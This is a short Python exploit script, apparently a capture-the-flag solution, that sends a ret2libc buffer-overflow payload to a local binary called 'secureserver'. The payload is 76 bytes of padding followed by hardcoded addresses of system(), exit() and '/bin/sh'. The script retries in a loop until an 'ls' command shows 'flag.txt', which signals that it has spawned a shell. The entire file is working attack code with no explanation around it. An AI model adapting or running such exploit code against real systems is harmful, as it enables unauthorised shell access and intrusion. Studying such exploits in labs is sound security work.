import os
import subprocess
import time

# Construct the payload
payload = "A" * 76  # Padding to overflow buffer
payload += "\x50\x40\xdc\xf7"  # Address of system()
payload += "\x90\x5b\xdb\xf7"  # Address of exit()
payload += "\x43\x0e\xf1\xf7"  # Address of "/bin/sh"

# Run the binary in a loop
while True:
    try:
        # Use subprocess to pipe payload into the binary
        process = subprocess.Popen(
            ['./secureserver'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = process.communicate(input=payload.encode() + b"\nls\n")
        
        # Print the output
        print(stdout.decode())
        print(stderr.decode())

        # Break if "ls" output indicates success
        if "flag.txt" in stdout.decode():  # Adjust based on expected output
            print("Exploit successful!")
            break

        time.sleep(1)  # Optional: Pause before retrying
    except KeyboardInterrupt:
        print("Exploit interrupted by user.")
        break

